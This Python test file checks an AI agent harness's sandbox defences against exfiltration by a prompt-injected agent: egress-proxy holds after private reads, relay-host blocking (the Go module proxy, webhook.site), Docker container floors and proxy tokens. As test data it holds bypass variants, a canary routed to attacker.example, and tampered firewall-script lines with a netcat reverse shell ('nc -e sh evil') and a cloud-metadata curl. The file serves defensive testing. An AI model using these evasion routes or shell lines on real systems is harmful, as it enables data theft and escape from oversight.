"""R37-SECA proof tests, green since R38-EGRESS (ADR-SEC-03),
with the bypass variants an AI attacker would try next beside each.

The attacker controls the code in an engine sandbox (prompt injection, a hostile repository or skill). Canaries are
planted here; nothing leaves the process.
"""

from __future__ import annotations

import secrets
from dataclasses import dataclass
from pathlib import Path
from typing import TYPE_CHECKING, Any

import pytest

from app.harness.websites import (
    EgressFlowUnenforced,
    LiveFlowHold,
    RunSites,
    site_destinations,
)
from app.sandbox.docker_proxy import DockerApiPolicy, PolicyDenied
from harness_core.contracts.generated.policy_data import WEBSITE_RULES
from harness_core.effects.flow import FlowRule
from harness_core.sandbox.egress import (
    EgressBinding,
    EgressProxy,
    EgressRefused,
    InMemoryEgressBindings,
    InMemoryTokenSource,
    ProxyLimits,
    ProxyRequest,
    StaticResolver,
)
from harness_core.sandbox.egress import EgressRefusalReason as R
from harness_core.sandbox.egress.sites import RELAY_HOSTS, registry_host, relay_host
from harness_core.sandbox.types import (
    EgressDestination,
    EgressPolicy,
    MountSpec,
    SiteAccess,
    SiteMode,
)
from harness_core.security.classification import UNCONFIGURED
from harness_core.testing.clock import ManualClock
from harness_core.testing.ids import SeededIds
from tests.unit.harness.sandbox_broker.test_docker_broker import (
    LEASE,
    _broker_on,  # pyright: ignore[reportPrivateUsage]
    _FakeApi,  # pyright: ignore[reportPrivateUsage]
    _FakeProvider,  # pyright: ignore[reportPrivateUsage]
    _spec,  # pyright: ignore[reportPrivateUsage]
)
from tests.unit.harness.sandbox_broker.test_wp14_workspace_quota import SUBPATH
from tests.unit.sandbox.test_docker_proxy import (
    _LEGACY_RUN,
    _RUN,
    EGRESS,
    IMAGE,
    _sdk_create_body,
)

if TYPE_CHECKING:
    from collections.abc import Mapping, Sequence

    from pydantic import JsonValue

    from harness_core.journal.types import JournalEvent

PUBLIC = "93.184.216.34"
LABELS = {"orgId": "o1", "sessionId": "s1", "runId": "r1", "attemptId": "a1"}
# What the run read and must not leave: a canary, hex-encoded as an exfiltrating program would put it in a path.
CANARY = "SECA-CANARY-7f3e"
HEX = CANARY.encode().hex()
GO_PROXY = "proxy.golang.org"
GO_SUMDB = "sum.golang.org"
ATTACKER = "attacker.example"


@dataclass
class _Ledger:
    """The session ledger as RunSites reads it: ``None`` is unknown, a non-empty set is a private read."""

    records: frozenset[str] | None = frozenset()

    def apply(self, events: Sequence[JournalEvent]) -> None:
        return None

    def source_records(self, run_id: str) -> frozenset[str] | None:
        return self.records


@dataclass
class _Policy:
    sites: list[Mapping[str, JsonValue]]

    async def allowed_sites(self) -> list[Mapping[str, JsonValue]]:
        return self.sites


async def _proxy(destinations: tuple[EgressDestination, ...]) -> tuple[EgressProxy, EgressBinding]:
    binding = EgressBinding("sbx-a", "10.213.0.2", "10.213.0.3", EgressPolicy(destinations=destinations), LABELS)
    clock = ManualClock()
    bindings = InMemoryEgressBindings()
    await bindings.register(binding)
    proxy = EgressProxy(
        bindings=bindings,
        tokens=InMemoryTokenSource(b"seca", clock, ttl_s=600),
        resolver=StaticResolver({d.host: [PUBLIC] for d in destinations}),
        upstreams={},
        clock=clock,
        ids=SeededIds(),
        limits=ProxyLimits(intercepts=True),
    )
    return proxy, binding


async def _send(proxy: EgressProxy, binding: EgressBinding, host: str, method: str, path: str, body: bytes = b"") -> Any:  # noqa: ANN401
    request = ProxyRequest(method, path, (("Host", host),), body)
    return await proxy.authorize_intercepted(
        request, host=host, port=443, local=binding.proxy_address, peer=binding.sandbox_address
    )


def _registries_preset() -> list[Mapping[str, JsonValue]]:
    [preset] = [p for p in WEBSITE_RULES.presets if p.id == "package-registries"]
    return [{"host": host.root, "access": "read"} for host in preset.sites]


# --- SEC-A-01: a read-only website after a private read is still a way out ------------------------------------------


def test_sec_a_01_the_package_registries_preset_names_no_relay_and_only_registries() -> None:
    """Fixed (R38-EGRESS): the Go module proxy and checksum database fetch any module path's origin on a cache miss
    (``GOPROXY`` protocol: ``/<module>/@v/list``), so they are relay hosts, out of the one-click preset. Every preset
    host is one of the release's registries, which serve only their own files."""
    hosts = {d.host for d in site_destinations(_registries_preset(), private_names=frozenset())}
    assert not {GO_PROXY, GO_SUMDB} & hosts
    assert hosts == {h.root for h in WEBSITE_RULES.presets[0].sites}, "a preset host the release would drop"
    assert all(registry_host(h) and not relay_host(h) for h in hosts)


async def test_sec_a_01_after_a_private_read_the_go_module_proxy_carries_no_data_to_an_attackers_host() -> None:
    # An admin who still lists Go's proxy read-only: a relay is dropped from a read entry, and refused if bound.
    go_sites = [{"host": GO_PROXY, "access": "read"}, {"host": GO_SUMDB, "access": "read"}]
    assert site_destinations(go_sites) == ()
    sites = RunSites(_Policy(_registries_preset() + go_sites), UNCONFIGURED, _Ledger(frozenset({"rec-private"})), "r1", (FlowRule("ask"),))
    proxy, binding = await _proxy(await sites())
    # proxy.golang.org answers this by fetching https://attacker.example/<hex>?go-get=1: the canary would reach the
    # attacker's server from Google's network, and nothing in the sandbox ever dialled it.
    with pytest.raises(EgressRefused):
        _ = await _send(proxy, binding, GO_PROXY, "GET", f"/{ATTACKER}/{HEX}/@v/list")
    with pytest.raises(EgressRefused):
        _ = await _send(proxy, binding, GO_SUMDB, "GET", f"/lookup/{ATTACKER}/{HEX}@v0.0.1")
    # Bound read-write by an admin who confirmed it, Go's proxy is a send like any upload: held after a private read.
    rw = await RunSites(
        _Policy([{"host": GO_PROXY, "access": "read-write", "readWriteConfirmed": True}]), UNCONFIGURED,
        _Ledger(frozenset({"rec-private"})), "r1", (FlowRule("ask"),),
    )()
    proxy, binding = await _proxy(rw)
    with pytest.raises(EgressRefused) as held:
        _ = await _send(proxy, binding, GO_PROXY, "GET", f"/{ATTACKER}/{HEX}/@v/list")
    assert held.value.reason is R.SITE_UPLOAD_HELD


async def test_sec_a_01_after_a_private_read_a_websites_url_carries_no_data_without_a_person() -> None:
    """The root cause, apart from Go: FG2 holds ``fetch_url`` when its URL would carry what the run read to an outside
    host; the same GET from the sandbox's shell now waits for the same person (``site_request_held``)."""
    sites = RunSites(
        _Policy([{"host": "docs.example.com", "access": "read"}]), UNCONFIGURED, _Ledger(frozenset({"rec-private"})), "r1",
        (FlowRule("ask"),),
    )
    proxy, binding = await _proxy(await sites())
    with pytest.raises(EgressRefused) as held:
        _ = await _send(proxy, binding, "docs.example.com", "GET", f"/search?q={HEX}")
    assert held.value.reason is R.SITE_REQUEST_HELD


# What an AI attacker tries next against a held site: every method a read may use, the data in the path instead of the
# query, an encoded query, a fragment that no client sends, a body on a GET, a chunked GET, case and a trailing dot.
_HELD_VARIANTS: tuple[tuple[str, str, bytes, tuple[tuple[str, str], ...]], ...] = (
    ("GET", f"/{HEX}", b"", ()),
    ("HEAD", f"/x?d={HEX}", b"", ()),
    ("OPTIONS", f"/{HEX}", b"", ()),
    ("GET", f"/x%3Fd%3D{HEX}", b"", ()),
    ("GET", f"/x;d={HEX}", b"", ()),
    ("GET", "/x", HEX.encode(), ()),
    ("GET", "/x", b"", (("Transfer-Encoding", "chunked"),)),
    ("get", f"/x?d={HEX}", b"", ()),
)


@pytest.mark.parametrize(("method", "path", "body", "headers"), _HELD_VARIANTS)
async def test_sec_a_01_no_request_shape_leaves_a_held_site(
    method: str, path: str, body: bytes, headers: tuple[tuple[str, str], ...]
) -> None:
    sites = await RunSites(
        _Policy([{"host": "docs.example.com", "access": "read"}]), UNCONFIGURED, _Ledger(frozenset({"rec-private"})),
        "r1", (FlowRule("ask"),),
    )()
    proxy, binding = await _proxy(sites)
    request = ProxyRequest(method, path, (("Host", "docs.example.com"), *headers), body)
    with pytest.raises(EgressRefused):
        _ = await proxy.authorize_intercepted(
            request, host="docs.example.com", port=443, local=binding.proxy_address, peer=binding.sandbox_address
        )


async def test_sec_a_01_package_installs_keep_working_after_a_private_read_and_carry_no_query() -> None:
    """(c): the registries stay usable after a private read: a path is the registry's own file, nothing relays it."""
    sites = RunSites(_Policy(_registries_preset()), UNCONFIGURED, _Ledger(frozenset({"rec-private"})), "r1", (FlowRule("ask"),))
    bound = await sites()
    assert all(d.site is not None and d.site.held for d in bound)
    proxy, binding = await _proxy(bound)
    for host, path in (
        ("pypi.org", "/simple/requests/"),
        ("files.pythonhosted.org", "/packages/aa/bb/requests-2.32.3-py3-none-any.whl"),
        ("registry.npmjs.org", "/left-pad"),
        ("registry.npmjs.org", "/left-pad/-/left-pad-1.3.0.tgz"),
        ("index.crates.io", "/se/rd/serde"),
        ("repo1.maven.org", "/maven2/junit/junit/4.13.2/junit-4.13.2.pom"),
        ("index.rubygems.org", "/info/rails"),
    ):
        forward = await _send(proxy, binding, host, "GET", path)
        assert forward.method == "GET"
    # A query string, a write, or a registry's own search with data in it: held.
    for host, method, path in (
        ("pypi.org", "GET", f"/search/?q={HEX}"),
        ("registry.npmjs.org", "GET", f"/-/v1/search?text={HEX}"),
        ("registry.npmjs.org", "PUT", "/left-pad"),
    ):
        with pytest.raises(EgressRefused):
            _ = await _send(proxy, binding, host, method, path, b"x" if method == "PUT" else b"")


def test_sec_a_01_every_preset_host_is_classified_and_no_relay_is_a_registry() -> None:
    """(b): the release's classification is data, checked here as a whole: a new preset host must be a registry the
    release explains, and no registry may also be a relay (or be covered by one)."""
    registries = {entry.host: entry.reason for entry in WEBSITE_RULES.registry_hosts}
    for preset in WEBSITE_RULES.presets:
        for host in preset.sites:
            assert host.root in registries, f"{host.root} is a preset host the release does not classify"
    for host, reason in registries.items():
        assert reason.strip() and not relay_host(host), host
    for relay in RELAY_HOSTS:
        assert relay_host(relay) and not registry_host(relay.removeprefix("*.")), relay


@pytest.mark.parametrize("host", ["webhook.site", "x.workers.dev", "x.pages.dev", "proxy.golang.org", "bit.ly", "r.jina.ai"])
def test_sec_a_01_a_relay_host_is_never_a_read_only_site(host: str) -> None:
    pattern = f"*.{host.split('.', 1)[1]}" if host.startswith("x.") else host
    assert site_destinations([{"host": pattern, "access": "read"}]) == ()


async def test_sec_a_01_a_relay_bound_read_only_anyway_refuses_every_method() -> None:
    """Defence in depth at the proxy: a binding that somehow holds a relay read-only still sends it nothing."""
    relay = EgressDestination("hook.workers.dev", (443,), site=SiteAccess(SiteMode.READ))
    proxy, binding = await _proxy((relay,))
    for method in ("GET", "HEAD", "OPTIONS"):
        with pytest.raises(EgressRefused) as refused:
            _ = await _send(proxy, binding, "hook.workers.dev", method, f"/{HEX}")
        assert refused.value.reason is R.SITE_RELAY


# --- SEC-A-02: the flow rule narrows websites once per turn, not when the turn reads private data -----------------


@dataclass
class _Shelf:
    sandbox: str | None = "sbx-a"

    def sandbox_id(self) -> str | None:
        return self.sandbox


@dataclass
class _ProxyControl:
    """The worker's control client, straight onto the real proxy's narrowing."""

    proxy: EgressProxy
    calls: list[tuple[str, str, str]]
    fail: bool = False

    async def hold_flow(self, *, sandbox_id: str, run_id: str, hold: str) -> None:
        self.calls.append((sandbox_id, run_id, hold))
        if self.fail:
            raise ConnectionError("control plane down")
        _ = await self.proxy.hold_flow(sandbox_id, run_id=run_id, hold=hold)


async def test_sec_a_02_a_private_read_mid_turn_holds_the_read_write_site_at_once() -> None:
    ledger = _Ledger()
    sites = RunSites(
        _Policy([{"host": "mirror.example.org", "access": "read-write", "readWriteConfirmed": True}]),
        UNCONFIGURED, ledger, "r1", (FlowRule("ask"),),
    )
    # The turn starts before any private read: the kernel binds the sandbox through the live hold.
    calls: list[tuple[str, str, str]] = []
    live = LiveFlowHold(sites, None, _Shelf())
    proxy, binding = await _proxy(await live.sites())
    live.control = _ProxyControl(proxy, calls)
    # Mid-turn, the engine calls a knowledge tool through the Tool Gateway: the session ledger records the private read,
    # and the kernel narrows the sandbox before the engine reads the result (``_TrackingEndpoint``).
    ledger.records = frozenset({"rec-private"})
    await live.narrow()
    assert calls == [("sbx-a", "r1", "held")]
    # The same turn then uploads what it read: held, as the next turn would be.
    with pytest.raises(EgressRefused) as held:
        _ = await _send(proxy, binding, "mirror.example.org", "POST", "/upload", CANARY.encode())
    assert held.value.reason is R.SITE_UPLOAD_HELD
    with pytest.raises(EgressRefused):
        _ = await _send(proxy, binding, "mirror.example.org", "GET", f"/?d={HEX}")
    # Once per sandbox: the next gateway call asks the proxy nothing new.
    await live.narrow()
    assert len(calls) == 1


async def test_sec_a_02_a_classification_raise_mid_turn_takes_every_site_away() -> None:
    from harness_core.sandbox.egress import EgressRefusalReason

    ledger = _Ledger()
    sites = RunSites(_Policy([{"host": "docs.example.com", "access": "read"}]), UNCONFIGURED, ledger, "r1", (FlowRule("ask"),))
    live = LiveFlowHold(sites, None, _Shelf())
    proxy, binding = await _proxy(await live.sites())
    live.control = _ProxyControl(proxy, [])
    assert (await _send(proxy, binding, "docs.example.com", "GET", "/")).method == "GET"
    # The proxy narrows to ``forbidden`` exactly as a bind under a ``deny`` level would.
    _ = await proxy.hold_flow("sbx-a", run_id="r1", hold="forbidden")
    with pytest.raises(EgressRefused) as gone:
        _ = await _send(proxy, binding, "docs.example.com", "GET", "/")
    assert gone.value.reason is EgressRefusalReason.DESTINATION_NOT_ALLOWED


async def test_sec_a_02_a_hold_that_could_not_reach_the_proxy_withholds_the_result() -> None:
    ledger = _Ledger()
    sites = RunSites(_Policy([{"host": "docs.example.com", "access": "read"}]), UNCONFIGURED, ledger, "r1", (FlowRule("ask"),))
    live = LiveFlowHold(sites, None, _Shelf())
    proxy, _binding = await _proxy(await live.sites())
    live.control = _ProxyControl(proxy, [], fail=True)
    ledger.records = frozenset({"rec-private"})
    with pytest.raises(EgressFlowUnenforced):
        await live.narrow()


async def test_sec_a_02_the_proxy_narrows_only_and_only_for_the_run_the_sandbox_serves() -> None:
    from harness_core.sandbox.egress.site_grants import SiteGrantInvalid

    proxy, binding = await _proxy((EgressDestination("docs.example.com", (443,), site=SiteAccess(SiteMode.READ)),))
    for sandbox, run, hold in (("sbx-a", "r2", "held"), ("sbx-gone", "r1", "held"), ("sbx-a", "r1", "allow"), ("sbx-a", "", "held")):
        with pytest.raises(SiteGrantInvalid):
            _ = await proxy.hold_flow(sandbox, run_id=run, hold=hold)
    assert await proxy.hold_flow("sbx-a", run_id="r1", hold="held") is True
    assert await proxy.hold_flow("sbx-a", run_id="r1", hold="held") is False, "idempotent"
    # A hold never widens: the person's release for this sandbox is a site grant, kept across the narrowing.
    proxy.site_grants.issue(proxy.bindings.get("sbx-a"), host="docs.example.com", run_id="r1")  # type: ignore[arg-type]
    assert (await _send(proxy, binding, "docs.example.com", "GET", f"/?q={HEX}")).method == "GET"
    assert await proxy.hold_flow("sbx-a", run_id="r1", hold="held") is False
    assert (await _send(proxy, binding, "docs.example.com", "GET", "/")).method == "GET"


async def test_sec_a_02_the_kernel_withholds_a_result_the_proxy_could_not_be_narrowed_for() -> None:
    from harness_core.engines.durable.kernel import (
        EGRESS_FLOW_UNENFORCED,
        _TrackingEndpoint,  # pyright: ignore[reportPrivateUsage]
    )
    from harness_core.gateway.types import McpResult

    secret = McpResult(f"the private record says {CANARY}", is_error=False, disposition="executed", retryable=False, invocation_id="i1")

    class _Inner:
        async def call_tool(self, *_: Any, **__: Any) -> McpResult:  # noqa: ANN401
            return secret

    async def nothing() -> None:
        return None

    async def failing() -> None:
        raise EgressFlowUnenforced("down")

    ok = _TrackingEndpoint(_Inner(), nothing, egress_flow=nothing)  # type: ignore[arg-type]
    assert (await ok.call_tool(None, "knowledge", {})).text == secret.text  # type: ignore[arg-type]
    withheld = _TrackingEndpoint(_Inner(), nothing, egress_flow=failing)  # type: ignore[arg-type]
    result = await withheld.call_tool(None, "knowledge", {})  # type: ignore[arg-type]
    assert result.is_error and CANARY not in result.text and result.reason_code == EGRESS_FLOW_UNENFORCED
    assert result.invocation_id == "i1"


# --- SEC-A-03: a persistent workspace is bounded by a 10 s poll, not by the kernel ---------------------------------


class _HelperApi(_FakeApi):
    """Lets the broker's helper (``true``) through, and stops at the sandbox's own create."""

    def create_container(self, image: str, **kwargs: Any) -> dict[str, Any]:  # noqa: ANN401
        if kwargs.get("command") == ["true"]:
            return {"Id": "helper"}
        return super().create_container(image, **kwargs)

    def put_archive(self, *_: Any, **__: Any) -> bool:  # noqa: ANN401
        return True

    def remove_container(self, *_: Any, **__: Any) -> None:  # noqa: ANN401
        return None


def _kernel_bounded(host_config: Mapping[str, Any]) -> bool:
    """Whether the kernel, not a poll, bounds how far the sandbox can write past its quota: a size-capped volume for
    the workspace, a writable-layer size, or a write-bandwidth limit that caps the overshoot between two polls."""
    for mount in host_config.get("Mounts") or []:
        options = (mount.get("VolumeOptions") or {}).get("DriverConfig") or {}
        if "size" in str(options.get("Options") or {}):
            return True
    return bool(host_config.get("StorageOpt")) or bool(host_config.get("BlkioDeviceWriteBps"))


async def test_sec_a_03_a_persistent_workspace_write_is_bounded_by_the_kernel() -> None:
    """The kernel caps how fast the sandbox writes to the disk under the workspace, so how far it can go past its quota
    between two measures of the guard is known (rate × interval), not as fast as the SSD allows."""
    from app.harness.sandbox.docker_broker import WriteBound

    provider = _FakeProvider()
    provider.client.api = _HelperApi()
    bound = WriteBound("/dev/nvme0n1", 32)
    broker = _broker_on(
        provider, SUBPATH, data_volume="data", helper_image="img", workspace_quota_mb=64, write_bound=bound
    )
    with pytest.raises(Exception):  # noqa: B017 - the fake stops after recording the create
        await broker.acquire(_spec(mounts=(MountSpec("/ws", source="org-a/ses-1/ws"),)), lease=LEASE, idempotency_key="k")
    [host_config] = provider.client.api.host_configs
    assert any(m.get("Target") == "/ws" for m in host_config["Mounts"]), "the workspace is the shared volume's subpath"
    assert _kernel_bounded(host_config)
    assert host_config["BlkioDeviceWriteBps"] == [{"Path": "/dev/nvme0n1", "Rate": 32 * 1024 * 1024}]
    assert bound.overshoot_mb == 320 and broker.write_mbps == 32


@pytest.mark.parametrize(("device", "mbps"), [("nvme0n1", 32), ("/dev/sda", 0), ("/dev/sda", -5), ("", 32), ("/etc/passwd", 1)])
def test_sec_a_03_a_write_bound_names_a_device_and_a_rate(device: str, mbps: int) -> None:
    from app.harness.sandbox.docker_broker import WriteBound

    with pytest.raises(ValueError):
        _ = WriteBound(device, mbps)


def test_sec_a_03_the_broker_reads_its_write_bound_and_refuses_a_bad_one(monkeypatch: pytest.MonkeyPatch) -> None:
    from app.sandbox_broker_main import InvalidWriteBound, write_bound

    monkeypatch.delenv("SANDBOX_DATA_DEVICE", raising=False)
    assert write_bound() is None
    monkeypatch.setenv("SANDBOX_DATA_DEVICE", "/dev/sda")
    assert write_bound() is not None and write_bound().mbps == 32  # type: ignore[union-attr]
    monkeypatch.setenv("SANDBOX_WRITE_MBPS", "nope")
    with pytest.raises(InvalidWriteBound):
        _ = write_bound()


# --- SEC-A-04: the legacy Docker API proxy admits a sandbox with no process, file or capability floor -------------


def test_sec_a_04_the_legacy_proxy_refuses_a_run_without_the_brokers_floor() -> None:
    policy = DockerApiPolicy(allowed_images=frozenset({IMAGE}), allowed_networks=frozenset({EGRESS}))
    # What legacy run_code sent before the fix: no PidsLimit (a fork bomb reaches the host's pid table under runc), a
    # writable root, Docker's default capabilities and the image's own user.
    body = _sdk_create_body(**_LEGACY_RUN)
    host = body["HostConfig"]
    assert not host.get("PidsLimit") and not host.get("ReadonlyRootfs") and not host.get("CapDrop")
    with pytest.raises(PolicyDenied):
        _ = policy.check_container_create(body)


def _floored() -> dict[str, Any]:
    return _sdk_create_body(**_RUN)


# Each field an attacker who reached sandbox-control would drop or bend, one at a time, from a body the proxy admits.
_WEAKENED: tuple[tuple[str, Any], ...] = (
    ("PidsLimit", None), ("PidsLimit", 0), ("PidsLimit", -1), ("Memory", 0), ("NanoCpus", None),
    ("MemorySwap", -1), ("ReadonlyRootfs", False), ("CapDrop", []), ("CapDrop", ["NET_RAW"]),
    ("SecurityOpt", []), ("SecurityOpt", ["no-new-privileges:false"]), ("PidsLimit", True),
)


@pytest.mark.parametrize(("key", "value"), _WEAKENED)
def test_sec_a_04_every_floor_field_is_required(key: str, value: Any) -> None:  # noqa: ANN401
    policy = DockerApiPolicy(allowed_images=frozenset({IMAGE}), allowed_networks=frozenset({EGRESS}))
    _ = policy.check_container_create(_floored())
    body = _floored()
    if value is None:
        body["HostConfig"].pop(key, None)
    else:
        body["HostConfig"][key] = value
    with pytest.raises(PolicyDenied):
        _ = policy.check_container_create(body)


@pytest.mark.parametrize("user", ["root", "0", "0:0", "", None, "root:sandbox"])
def test_sec_a_04_a_run_never_starts_as_root(user: str | None) -> None:
    policy = DockerApiPolicy(allowed_images=frozenset({IMAGE}), allowed_networks=frozenset({EGRESS}))
    body = _floored()
    body["User"] = user
    with pytest.raises(PolicyDenied):
        _ = policy.check_container_create(body)


def test_sec_a_04_root_with_capabilities_is_only_ever_the_firewall_script() -> None:
    from app.agent_loop_lib.sandbox.coding.egress_firewall import (
        build_firewall_script,
        firewalled_container_kwargs,
    )

    policy = DockerApiPolicy(allowed_images=frozenset({IMAGE}), allowed_networks=frozenset({EGRESS}))
    good = firewalled_container_kwargs(["pip", "install", "x"], network_cidrs=["172.30.0.0/16"], token="a" * 32)
    script = build_firewall_script(["172.30.0.0/16"], token="a" * 32)
    base = {**_RUN, "network": EGRESS, "network_disabled": False}
    base.pop("network_mode")
    _ = policy.check_container_create(_sdk_create_body(**{**base, **good}))
    for tampered in (
        script.replace('exec setpriv', 'curl http://169.254.169.254/; exec setpriv'),
        script.replace("--reuid=sandbox", "--reuid=root"),
        script.replace("r -A OUTPUT -o lo -j ACCEPT", "r -A OUTPUT -j ACCEPT"),
        script + "id\n",
        script.replace("-d 172.30.0.0/16 -j REJECT", "-d 172.30.0.0/16 -j ACCEPT; sh"),
        script.replace("set -u", "set -u; nc -e sh evil 1"),
    ):
        bad = {**good, "command": ["sh", "-c", tampered, "sandbox-egress", "pip", "install", "x"]}
        with pytest.raises(PolicyDenied):
            _ = policy.check_container_create(_sdk_create_body(**{**base, **bad}))
    # The firewall's capabilities on a container that is not the firewall, or NET_RAW on any.
    for caps, user in ((["NET_ADMIN"], "sandbox"), (["NET_RAW"], "0"), (["NET_ADMIN"], "1000")):
        with pytest.raises(PolicyDenied):
            _ = policy.check_container_create(_sdk_create_body(**{**base, **good, "cap_add": caps, "user": user}))
    # The firewall's install step on no network at all is not the firewall's.
    offline = {**_RUN, **good}
    with pytest.raises(PolicyDenied):
        _ = policy.check_container_create(_sdk_create_body(**offline))


@pytest.mark.parametrize("mount", [
    {"Type": "volume", "Source": "pipeshub_mongodb_data", "Target": "/d"},
    {"Type": "volume", "Target": "/d", "VolumeOptions": {"DriverConfig": {"Name": "local", "Options": {"o": "bind", "device": "/"}}}},
    {"Type": "volume", "Target": "/d", "VolumeOptions": {"Subpath": "x"}},
    {"Type": "bind", "Source": "/", "Target": "/host"},
    {"Type": "volume", "Target": "/d", "BindOptions": {"Propagation": "rshared"}},
])
def test_sec_a_04_a_writable_directory_is_only_ever_an_anonymous_volume(mount: dict[str, Any]) -> None:
    policy = DockerApiPolicy(allowed_images=frozenset({IMAGE}), allowed_networks=frozenset({EGRESS}))
    body = _floored()
    body["HostConfig"]["Mounts"] = [*body["HostConfig"]["Mounts"], mount]
    with pytest.raises(PolicyDenied):
        _ = policy.check_container_create(body)


async def test_sec_a_04_every_call_but_a_ping_carries_the_callers_credential() -> None:
    import asyncio

    from app.sandbox.docker_proxy import DockerSocketProxy, caller_token

    policy = DockerApiPolicy(allowed_images=frozenset({IMAGE}), allowed_networks=frozenset({EGRESS}))
    with pytest.raises(ValueError):
        _ = DockerSocketProxy(policy, "/nonexistent.sock", caller_token="short")
    with pytest.raises(RuntimeError):
        _ = caller_token({})
    token = secrets.token_hex(32)
    assert caller_token({"DOCKER_PROXY_TOKEN": token}) == token
    proxy = DockerSocketProxy(policy, "/nonexistent.sock", caller_token=token)
    server = await asyncio.start_server(proxy.handle, "127.0.0.1", 0)
    port = server.sockets[0].getsockname()[1]

    async def call(head: str) -> bytes:
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        writer.write(head.encode())
        await writer.drain()
        data = await reader.read()
        writer.close()
        return data

    try:
        create = "POST /v1.43/containers/create HTTP/1.1\r\nHost: d\r\nContent-Length: 2\r\n{auth}\r\n{{}}"
        for auth in ("", "Authorization: Bearer wrong\r\n", f"Authorization: bearer {token}\r\n", f"Authorization: Bearer {token[:-1]}\r\n"):
            answer = await call(create.format(auth=auth))
            assert answer.startswith(b"HTTP/1.1 403") and b"credential" in answer, answer[:120]
        # The ping is open (the healthcheck); with the credential a create reaches the policy, which refuses ``{}``.
        assert b"credential" not in await call("GET /_ping HTTP/1.1\r\nHost: d\r\n\r\n")
        answer = await call(create.format(auth=f"Authorization: Bearer {token}\r\n"))
        assert b"credential" not in answer and answer.startswith(b"HTTP/1.1 403")
    finally:
        server.close()


@pytest.mark.parametrize("env", [
    {},
    {"DOCKER_PROXY_TOKEN": "   "},
    {"DOCKER_PROXY_TOKEN": "changeme"},
    {"DOCKER_PROXY_TOKEN": "Your_Random_Encryption_Secret_Key"},
    {"DOCKER_PROXY_TOKEN": "a" * 64},
    {"DOCKER_PROXY_TOKEN": "0123456789abcdef" * 4},
    {"DOCKER_PROXY_TOKEN": "68656c6c6f20776f726c6421206869207468657265"},
    {"SECRET_KEY": "2d711642b726b04401627ca9fbac32f5c8530fb1903cc4db02258717921a4881"},
])
def test_sec_a_04_no_caller_credential_is_missing_guessable_or_derived(env: dict[str, str]) -> None:
    """ADR-KEY-02: the token is generated; neither side falls back to one derived from the root key."""
    from app.sandbox.docker_proxy import caller_token

    with pytest.raises(RuntimeError):
        _ = caller_token(env)


@pytest.mark.parametrize("name", ["SECRET_KEY", "SECRET_KEY_PREVIOUS", "SECRET_KEY_NEXT"])
def test_sec_a_04_the_socket_proxy_refuses_to_start_beside_a_platform_key(name: str) -> None:
    from app.sandbox.docker_proxy import proxy_caller_token

    env = {"DOCKER_PROXY_TOKEN": secrets.token_hex(32), name: secrets.token_hex(32)}
    with pytest.raises(RuntimeError, match=name):
        _ = proxy_caller_token(env)
    assert proxy_caller_token({"DOCKER_PROXY_TOKEN": env["DOCKER_PROXY_TOKEN"]}) == env["DOCKER_PROXY_TOKEN"]


def test_sec_a_04_the_socket_proxy_imports_no_third_party_package_for_its_credential() -> None:
    """The proxy starts without the app's dependencies: the strength rules it reuses are stdlib only."""
    import subprocess
    import sys

    probe = ("import sys; sys.path.insert(0, '.'); from app.sandbox.docker_proxy import caller_token; "
             "print('cryptography' in sys.modules)")
    out = subprocess.run([sys.executable, "-I", "-c", probe], cwd=Path(__file__).resolve().parents[4],
                         capture_output=True, text=True, check=True, timeout=60)
    assert out.stdout.strip() == "False"
